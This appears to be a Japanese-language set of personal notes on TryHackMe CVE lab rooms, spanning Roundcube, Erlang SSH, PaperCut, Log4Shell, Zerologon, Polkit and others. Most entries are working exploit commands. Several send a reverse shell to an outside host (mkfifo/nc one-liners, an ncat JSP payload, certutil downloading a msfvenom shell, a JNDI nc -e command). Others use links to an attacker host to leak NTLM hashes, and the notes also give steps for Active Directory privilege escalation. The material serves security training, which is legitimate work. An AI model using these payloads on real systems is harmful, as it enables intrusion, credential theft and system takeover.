# CVE

## CVE-2025-49113 (Roundcube)

https://tryhackme.com/room/roundcubecve202549113

- [Roundcube](https://roundcube.net/) は、オープンソースウェブメールプロジェクト
- `1.5.x < 1.5.10`、`1.6.x < 1.6.11`
- RCE (Authenticated)

```sh
git clone https://github.com/fearsoff-org/CVE-2025-49113
cd CVE-2025-49113/

# 必ず成功するとは限らないので、何度か実行してみる。
php CVE-2025-49113.php http://10.10.220.172/roundcube <user> <password> "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.13.85.243 4444 >/tmp/f"
```

## CVE-2025-32433

https://tryhackme.com/room/erlangotpsshcve202532433

https://github.com/ProDefense/CVE-2025-32433/blob/main/CVE-2025-32433.py

- Erlang/OTP SSH
- 修正：OTP-27.3.3, OTP-26.2.5.11, or OTP-25.3.2.20.
- 認証情報不要

上記 URL の PoC は無害なファイルを作るだけ。

```
file:write_file("/lab.txt", <<"pwned">>)
```

os::cmd を使うことで、任意のコードを実行できる。

```
command='os:cmd("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.13.85.243 6666 >/tmp/f").'
```

## CVE-2024-21413（Moniker Link）

https://tryhackme.com/room/monikerlink

https://github.com/CMNatic/CVE-2024-21413

- Outlook の脆弱性で、Windows netNTLMv2 hash を盗む。
- アプリケーションを指定するリンクをモニカーリンクという。
- ユーザーがリンクをクリックしたら、ローカル認証情報が指定した IP に送信される。

```sh
# 通常のモニカーリンクは保護ビューにブロックされる
<p><a href="file://ATTACKER_MACHINE/test">Click me</a></p>

# 「!」文字を入れて、保護ビューをバイパスするリンク
<p><a href="file://ATTACKER_MACHINE/test!exploit">Click me</a></p>
```

## CVE-2024-57727 (SimpleHelp)

https://tryhackme.com/room/simplehelpcve202457727

- SimpleHelp <= v5.5.7
- パストラバーサルの脆弱性
- この他に、CVE-2024-57726、CVE-2024-57728 もある

```sh
git clone https://github.com/imjdl/CVE-2024-57727
cd CVE-2024-57727

# 脆弱性があるかどうか確認
python3 poc.py http://MACHINE_IP
```

Windows 用

```sh
# --path-as-is により、.. が正規化されなくなる
curl --path-as-is http://MACHINE_IP/toolbox-resource/../resource1/../../configuration/serverconfig.xml
```

Linux 用

```sh
# Linuxの場合、resource1 の部分を有効なディレクトリ名にする必要がある
curl --path-as-is http://MACHINE_IP/toolbox-resource/../secmsg/../../configuration/serverconfig.xml
```

secmsg 以外の候補 `alertsdb, backups, branding, history, html, notifications, recordings, remotework, simulations, sslconfig, techprefs, templates, toolbox, toolbox-resources, translations
`

## CVE-2025-29927 (Next.js)

https://tryhackme.com/room/nextjscve202529927

- Next.js < 15.2.3, 14.2.25, 13.5.9, 12.3.5
- ミドルウェアベースの認証バイパスの脆弱性
- HTTP ヘッダーを追加するだけ

```sh
curl -H "x-middleware-subrequest: middleware" http://10.10.234.130:3000/protected
```

## CVE-2024-50379 (Tomcat)

https://tryhackme.com/room/tomcatcve202450379

- Apache Tomcat `11.0.0-M1 ~ 11.0.1`, `10.1.0-M1 ~ 10.1.33`, `9.0.0-M1 ~ 9.0.97`
- Time-of-check-Time-of-use（TOCTOU）脆弱性
- 大文字と小文字を区別しないシステム（Windows, macOS）において、デフォルトサーブレットに書き込み権限がある場合、JSP（Java Server Page）のコンパイル時に TOCTOU 競合状態が発生する。

書き込み権限があるとは、サーバーが PUT や DELETE などの HTTP コマンドを受け入れるように設定されていること。

```xml
<servlet>
  <servlet-name>default</servlet-name>
  <servlet-class>org.apache.catalina.servlets.DefaultServlet</servlet-class>
  <init-param>
    <param-name>readonly</param-name>
    <param-value>false</param-value>
  </init-param>
</servlet>
```

Linux では、demo.jsp と demo.Jsp は同じディレクトリに共存できるため成立しない。

Windows では、Tomcat は demo.jsp をサーブレットとして、demo.Jsp をテキストファイルとして扱う。

```sh
# これはエラーになる
curl -X PUT -d "test" http://10.10.87.31:8080/demo.jsp

# これはアップロード成功する（通常はテキストファイルとして扱われるので実行はされない）
curl -X PUT -d "test" http://10.10.87.31:8080/demo.Jsp
```

Jsp の PUT と jsp の GET が大量にリクエストされて高負荷になった場合、競合により Jsp がサーブレットとして実行される可能性がある。

```sh
git clone https://github.com/iSee857/CVE-2024-50379-PoC
```

```java
payload_put = "<%@ page import=\"java.io.*\" %><% Runtime.getRuntime().exec(\"cmd /c start ncat -e cmd.exe 10.10.54.182 8888\"); %>"
```

## CVE-2024-10924 (Really Simple Security)

https://tryhackme.com/room/bypassreallysimplesecurity

- WordPress の Really Simple Security プラグインの認証バイパス脆弱性
- 9.0.0 ~ 9.1.1.1
- プラグインの 2 要素認証（2FA）メカニズム用に設定された REST API エンドポイントが標的
- 2FA が有効になっているアカウントにのみ影響する

```python
url = "http://vulnerablewp.thm:8080/?rest_route=/reallysimplessl/v1/two_fa/skip_onboarding"
data = {
    "user_id": int(user_id),  # User ID from the argument
    "login_nonce": "invalid_nonce",  # Arbitrary value
    "redirect_to": "/wp-admin/"  # Target redirection
}

response = requests.post(url, json=data)
```

返ってきた Cookie をブラウザに設定すると、認証済状態になる。

## CVE-2023-27350 (PaperCut)

https://tryhackme.com/room/papercut

- PaperCut < `20.1.7`, `21.2.11`, `22.0.9`
- 認証バイパスの脆弱性。
- 管理コンソールにスクリプト機能があり RCE につながる。
- サンドボックス設定を無効にすると、スクリプトが Java ランタイムに直接アクセスできる。
- PrintCut サービスは、NT AUTHORITY\SYSTEM または root ユーザーで実行される。

認証バイパス方法は、下記 URL にアクセスするだけ。

`http://<ip>:9191/app?service=page/SetupCompleted`

その後、`Printers -> Template printer -> Scripting -> Enable print script` を有効化する。

下記のようにコマンドを実行できる。

```js
function printJobHook(inputs, actions) {
  // your script here
}
java.lang.Runtime.getRuntime().exec("ping.exe ATTACKER_IP");
```

CLI でコマンド実行できるエクスプロイト

https://github.com/horizon3ai/CVE-2023-27350/blob/main/CVE-2023-27350.py

```sh
# リバースシェルを作成してHTTPサーバー起動
msfvenom -p windows/shell/reverse_tcp -f exe LHOST=ATTACKER_IP LPORT=4444 -o shell.exe
python3 -m http.server 8080

# リバースシェルのリッスン
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/shell/reverse_tcp; set LHOST ATTACKER_IP; set LPORT 4444; exploit"

# ダウンロード＆実行
python3 CVE-2023-27350.py -u http://10.10.210.29:9191 -c "certutil.exe -urlcache -f http://ATTACKER_IP:8080/shell.exe shell.exe"
python3 CVE-2023-27350.py -u http://10.10.210.29:9191 -c "cmd.exe /c shell.exe"
```

## CVE-2023-23752 (Joomify)

https://tryhackme.com/room/joomify

- Joomla! `4.0.0 ~ 4.2.7`
- Joomla! は、第 5 位のコンテンツ管理システム（CMS）
- API エンドポイントで GET パラメータの public を true にすることで認証なしでアクセスできるようになる。
- 情報漏洩の脆弱性で、重大度は Medium。

api 配下のフォルダ構造を脆弱性のあるバージョンをダウンロードして調べることが可能。  
https://downloads.joomla.org/cms/joomla4/4-1-0

API リスト  
https://docs.joomla.org/J4.x:Joomla_Core_APIs

エクスプロイト

```sh
# アプリケーション設定（DB接続情報など）
curl -v http://10.10.120.177/api/index.php/v1/config/application?public=true

# ユーザー
curl -v http://10.10.120.177/api/index.php/v1/users?public=true
```

## CVE-2023-21746 (LocalPotato)

https://tryhackme.com/room/localpotato

https://github.com/decoder-it/LocalPotato

- 2023 年 1 月の月例パッチで修正済
- ターゲットマシンに任意のファイルを書き込むことが出来る脆弱性。
- [DLL ハイジャック（LPE via StorSvc）](https://github.com/blackarrowsec/redteam-research/tree/master/LPE%20via%20StorSvc)と組み合わせることで、権限昇格を実現する。

`SprintCSP.dll` `RpcClient.exe` のコンパイルが必要。

### 準備

#### RpcClient.exe

storsvc_c.c

```c
#define WIN10
//#define WIN11
//#define WIN2019
//#define WIN2022
```

#### SprintCSP.dll

main.c

例：現在のユーザーを管理者グループに追加する。

```c
void DoStuff() {

    // Replace all this code by your payload
    STARTUPINFO si = { sizeof(STARTUPINFO) };
    PROCESS_INFORMATION pi;
    CreateProcess(L"c:\\windows\\system32\\cmd.exe",L" /C net localgroup administrators user /add",
        NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS, NULL, L"C:\\Windows", &si, &pi);

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return;
}
```

### エクスプロイト

```ps
# PATHの確認
reg query "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" -v Path

# いずれかのPATHにコピーする必要があるが、権限不足でエラーになるので
copy SprintCSP.dll C:\Windows\System32\SprintCSP.dll

# LocalPotato を使ってコピーする
LocalPotato.exe -i SprintCSP.dll -o \Windows\System32\SprintCSP.dll

# RPCをトリガー
RpcClient.exe

# 確認
net user user
```

## CVE-2022-26923 (ActiveDirectory 証明書サービス (CS))

https://tryhackme.com/room/cve202226923

- 構成ミスのある証明書テンプレートを悪用することで、権限昇格やラテラルムーブメント（横方向の攻撃）が可能
- `Validate write to DNS hostname`, `Validate write to Service Principal Name (SPN)` の 2 つの権限が付与されている場合に脆弱性がある。

### ステップ

1. 権限の低い AD ユーザーの資格情報を侵害します。
2. これらの資格情報を使用して、ドメインに新しいホストを登録します。
3. コンピュータ AD オブジェクトの DNS ホスト名属性を、ドメイン コントローラなどの特権ホストの属性に変更します。
4. 固有の SPN 競合の問題を回避するために、SPN 属性を削除します。
5. デフォルトのテンプレートを使用してマシン証明書を要求します。
6. 受信したテンプレートを使用して、偽のマシン アカウントではなく特権マシン アカウントとして Kerberos 認証を実行します。

### エクスプロイト

/etc/hosts（kali）

```sh
10.10.254.197 lundc.lunar.eruca.com lundc lunar-LUNDC-CA lunar.eruca.com
```

https://github.com/ly4k/Certipy

```sh
# 権限の低いADユーザーの証明書
certipy req 'lunar.eruca.com/thm:Password1@@lundc.lunar.eruca.com' -ca LUNAR-LUNDC-CA -template User

# 証明書確認
certipy auth -pfx thm.pfx

# ドメインにコンピュータを追加（impacket）
addcomputer.py 'lunar.eruca.com/thm:Password1@' -method LDAPS -computer-name 'THMPC' -computer-pass 'Password1@'

# コンピュータの証明書
certipy req 'lunar.eruca.com/THMPC$:Password1@@lundc.lunar.eruca.com' -ca LUNAR-LUNDC-CA -template Machine

# 確認
certipy auth -pfx thmpc.pfx
```

```ps
# SPNを削除してからDNSホスト名をDCに変更
#（先にSPNを削除しないと、ホスト名変更によりSPNが自動変更され、SPN重複により変更失敗する）
Set-ADComputer THMPC -ServicePrincipalName @{}
Set-ADComputer THMPC -DnsHostName LUNDC.lunar.eruca.com
```

```sh
# 証明書偽造
certipy req 'lunar.eruca.com/THMPC$:Password1@@lundc.lunar.eruca.com' -ca LUNAR-LUNDC-CA -template Machine

# DC のNTLMハッシュが返る
certipy auth -pfx lundc.pfx
```

## CVE-2023-7028 (GitLab)

https://tryhackme.com/room/gitlabcve20237028

- `16.1~16.1.5`、`16.2~16.2.8`、`16.3~16.3.6`、`16.4~16.4.4`、`16.5~16.5.5`、`16.6~16.6.3`、`16.7~16.7.1`
- パスワードリセットメールを自分のアドレスに送信させ、任意のユーザーのパスワードをリセットできる。

poc（THM のリンクに修正版のコードがある）  
https://github.com/Vozec/CVE-2023-7028/blob/main/CVE-2023-7028.py

```sh
python3 attack.py -u http://10.10.207.254:8000 -t victim@mail.gitlab.thm -e attacker@mail.gitlab.thm
```

## CVE-2023-22515 (Confluence)

https://tryhackme.com/room/confluence202322515

- Atlassian Confluence Server および Data Center `<8.3.3`, `<8.4.3`, `<8.5.2`。※`8.2.0`他も有効。
- Confluence に完全な管理者権限を持つ追加アカウントを作成できる。
- 認証情報不要

XWork による getter, setter の連鎖により、

```
http://10.10.217.49:8090/server-info.action?bootstrapStatusProvider.applicationConfig.setupComplete=false
```

のリクエストは、下記の Java 呼び出しに変換され、セットアップ未完了の状態になる。

```
getBootstrapStatusProvider().getApplicationConfig().setSetupComplete(false)
```

その後、次にリクエストから管理者アカウントを作成できる。

```
http://10.10.217.49:8090/setup/setupadministrator-start.action
```

スクリプト  
https://github.com/Chocapikk/CVE-2023-22515

## CVE-2023-4911 (Looney Tunables)

https://tryhackme.com/room/looneytunes

- GNU C ライブラリのダイナミックローダー（ld.so）に存在するセキュリティ上の欠陥
- glibc `2.34`

```sh
# （参考）PoCを実行したマシンでは、2.35 と表示された
$ ldd --version
ldd (Ubuntu GLIBC 2.35-0ubuntu3.1) 2.35
```

### 背景

```sh
# コンパイル時、rpath でライブラリ検索パスを制御できる
gcc -Wl,--enable-new-dtags -Wl,-rpath=/tmp -o myapp myapp.c
```

```sh
# ld.so は、実行時に特定の環境変数をチェックする
GLIBC_TUNABLES="malloc.check=1:malloc.tcache_max=128"
```

本来、SXID_ERASE とマークされる危険な設定項目を削除しているが、パース処理に不備があった。

### エクスプロイト

https://github.com/leesh3288/CVE-2023-4911

メモリのランダムアドレスが偶然一致するまで、fork を繰り返すテクニックが使われている。

```sh
# "__libc_start_main" にシェルコードを上書きした libc.so.6 を生成
python3 gen_libc.py

# コンパイル
gcc -o exp exp.c

# 実行
./exp
```

## CVE-2023-38408

https://tryhackme.com/room/cve202338408

- OpenSSH `< 9.3p2`
- ターゲットが SSH 接続するとき、接続先のマシンが制御化にあることが必要。
- THM の説明は環境構築に関して不明瞭な点が多く、CTF 等での再現は難しい。

## CVE-2023-23397 (Outlook NTLM Leak)

https://tryhackme.com/room/outlookntlmleak

- Outlook デスクトップアプリ
- 感染したメールがユーザーの受信トレイに届くだけで、攻撃者は Net-NTLMv2 認証情報ハッシュを取得できる。

Outlook ではカレンダーの招待を送信するとき、リマインダー用の音声ファイルを指定できる。攻撃者はこのパラメータを利用する。

攻撃者のマシンのネットワーク共有フォルダに入っている音声ファイルを、UNC 形式で指定する。（例：`\\ATTACKER_IP\foo\bar.wav`）

Windows Server 以外では、ポート 445 以外を指定することができる。（FW 回避のため）

```
\\ATTACKER_IP@80\foo\bar.wav
\\ATTACKER_IP@443\foo\bar.wav
```

### エクスプロイト

前提：OutlookSpy プラグインをインストール（通常の音声ファイル選択機能では、UNC を設定できないため）

1. Responder で SMB 接続を待ち受ける。

```sh
sudo responder -I tun0
```

2. Outlook で、カレンダー、新しい予定。
3. OutlookSpy タブ、カレントアイテム。
4. script タブで入力

```
AppointmentItem.ReminderOverrideDefault = true
AppointmentItem.ReminderPlaySound = true
AppointmentItem.ReminderSoundFile = "\\ATTACKER_IP\noexist\sound.wav"
```

5. Run を実行
6. プロパティタブで設定反映を確認
7. リマインダーの時間を 0 分などに設定して予定を保存

### 自動エクスプロイト

https://github.com/api0cradle/CVE-2023-23397-POC-Powershell

```ps
Import-Module .\CVE-2023-23397.ps1

Send-CalendarNTLMLeak -recipient "test@thm.loc" -remotefilepath "\\ATTACKER_IP\foo\bar.wav" -meetingsubject "THM Meeting" -meetingbody "This is just a regular meeting invitation :)"
```

## CVE-2022-30190 (Follina MSDT)

https://tryhackme.com/room/follinamsdt

- Microsoft Support Diagnostic Tool

### エクスプロイト

https://github.com/JohnHammond/msdt-follina

```sh
root@ip-10-10-118-34:~/Rooms/Follina-MSDT# python3.9 follina.py -i ens5
[+] copied staging doc /tmp/mhhf08bg
[+] created maldoc ./follina.doc
[+] serving html payload on :8000
```

```sh
root@ip-10-10-118-34:~/Rooms/Follina-MSDT# python3 -m http.server 3456
Serving HTTP on 0.0.0.0 port 3456 (http://0.0.0.0:3456/) ...
```

```ps
C:\Users\Administrator\Desktop>curl http://[attackbox IP]:3456/follina.doc -o follina.docx
curl: (3) [globbing] bad range in column 9
curl: (3) [globbing] unmatched close brace/bracket in column 3
```

## CVE-2022-26134 (Atlassian)

https://tryhackme.com/room/cve202226134

- 認証情報不要 RCE
- `1.3.0 -> 7.4.17`, `7.13.0 -> 7.13.7`, `7.14.0 -> 7.14.3 `, `7.15.0 -> 7.15.2 `, `7.16.0 -> 7.16.4`, `7.17.0 -> 7.17.4`, `7.18.0 -> 7.18.1 `,

### エクスプロイト

OGNL (Object-Graph Navigation Language) を悪用する。  
例えば `touch /tmp/thm` を実行したい場合、下記リクエストを送る。

```sh
curl -v http://localhost:8090/%24%7B%40java.lang.Runtime%40getRuntime%28%29.exec%28%22touch%20/tmp/thm%22%29%7D/
```

#### スクリプト

PoC を THM のルームから添付ファイルとしてダウンロード可能。

```sh
python ./poc.py http://10.10.84.202:8090 cat%20/flag.txt
```


## CVE-2021-44228 (Log4Shell)

https://tryhackme.com/room/solar

https://github.com/christophetd/log4shell-vulnerable-app/blob/main/README.md

- `log4j < 2.16.0`
- JNDI の悪用。NJDIは、2.16.0 で完全に無効化された。

### テスト

次のHTTPヘッダーを送って、接続が返れば脆弱性があると判断できる。ヘッダーの種類はAcceptだけとは限らない。

```http
Accept: ${jndi:ldap://<attacker-ip>:8888}
```

```sh
nc -lvnp 8888
```

### エクスプロイト

```sh
git clone https://github.com/pimps/JNDI-Exploit-Kit
cd JNDI-Exploit-Kit
java -jar JNDI-Exploit-Kit.jar -C "nc 10.11.146.32 8888 -e /bin/sh" -A "10.11.146.32"
```

```sh
$ curl http://lumberjack.thm -H 'Accept: ${jndi:ldap://10.11.146.32:1389/5wvdvn}'
```

## CVE-2022-22965 (Spring4Shell)

https://tryhackme.com/room/spring4shell

- JDK9 以上かつ Spring Core (<5.2 | 5.2.0-19 | 5.3.0-17)

[PoC](https://github.com/BobTheShoplifter/Spring4Shell-POC/)

```sh
# THMに添付のコードを使用
$ ./exploit.py http://10.10.41.118/

Shell Uploaded Successfully!
Your shell can be found at: http://10.10.41.118/tomcatwar.jsp?pwd=thm&cmd=whoami
```

## CVE-2022-0847 (Dirty Pipe)

https://tryhackme.com/room/dirtypipe

- Linuxカーネル`5.16.11、5.15.25、5.10.102` で修正済。
- 読み取り権限のある任意のファイルに任意の内容を書き込み出来る。

[発見者のブログ記事](https://dirtypipe.cm4all.com/)  
[SUIDプログラムにシェルコードを挿入する手法](https://haxx.in/files/dirtypipez.c)

## CVE-2021-4034 (Pwnkit)

https://tryhackme.com/room/pwnkit

- pkexe の脆弱性を悪用した Linux のローカル権限昇格

[アドバイザリー](https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt)

[PoC](https://github.com/arthepsy/CVE-2021-4034)

修正済の場合、エクスプロイト実行時に pkexec はヘルプメニューを表示する。


## CVE-2020-1472 (Zero Logon)

https://tryhackme.com/room/zer0logon

- ドメインコントローラを乗っ取られる脆弱性
- マシンアカウントのパスワードをリセットする（パスワードなしにする）
- IVの値を0固定で暗号化していることが原因
- 2020年8月のパッチで修正

### PoC

https://github.com/SecuraBV/CVE-2020-1472

（パスワードリセット有）  
https://raw.githubusercontent.com/Sq00ky/Zero-Logon-Exploit/master/zeroLogon-NullPass.py

```sh
python zerologon-exploit.py DC01 <dc-ip>

sudo secretsdump.py -just-dc -no-pass DC01\$@<dc-ip>

evil-winrm -u Administrator -H <Local Admin Hash> -i MACHINE_IP
```

## CVE-2021-1675 / CVE -2021-34527 (PrintNightmare)

https://tryhackme.com/room/printnightmarehpzqlp8

- Windows 印刷Spoolerサービス脆弱性によるRCE

```sh
git clone https://github.com/tryhackme/CVE-2021-1675.git 
```

## CVE-2021-22204 (Exiftool)

https://tryhackme.com/room/dejavu

サーバーでExiftoolが実行されるとして、画像ファイルをアップロードする。

```sh
msf6 exploit(unix/fileformat/exiftool_djvu_ant_perl_injection) > set LHOST 10.11.146.32
LHOST => 10.11.146.32

msf6 exploit(unix/fileformat/exiftool_djvu_ant_perl_injection) > set PAYLOAD cmd/unix/reverse_bash
PAYLOAD => cmd/unix/reverse_bash

msf6 exploit(unix/fileformat/exiftool_djvu_ant_perl_injection) > run
[+] msf.jpg stored at /home/kali/.msf4/local/msf.jpg
```

## CVE-2021-3560 (Polkit)

https://tryhackme.com/room/polkit

- Red Hat Enterprise Linux 8
- Fedora 21 (or later)
- Debian Testing ("Bullseye")
- Ubuntu 20.04 LTS ("Focal Fossa")

ubuntuの場合、`0.105-26ubuntu1.1` でパッチがリリースされた。

```sh
apt list --installed | grep policykit-1
```

### エクスプロイト

```sh
# コマンドの実行にかかる時間を特定する
time dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:attacker string:"Pentester Account" int32:1

Error org.freedesktop.Accounts.Error.PermissionDenied: Authentication is required

real    0m0.012s
user    0m0.002s
sys     0m0.000s
```

```sh
# 処理中に強制終了する
dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:attacker string:"Pentester Account" int32:1 & sleep 0.005s; kill $!
[1] 1348

# 作成確認
tryhackme@polkit:~$ id attacker
uid=1000(attacker) gid=1000(attacker) groups=1000(attacker),27(sudo)
```

```sh
# パスワード生成
openssl passwd -6 Expl01ted

# 設定
dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts/User1000 org.freedesktop.Accounts.User.SetPassword string:'$6$TRiYeJLXw8mLuoxS$UKtnjBa837v4gk8RsQL2qrxj.0P8c9kteeTnN.B3KeeeiWVIjyH17j6sLzmcSHn5HTZLGaaUDMC4MXCjIupp8.' string:'Ask the pentester' & sleep 0.005s; kill $!
```
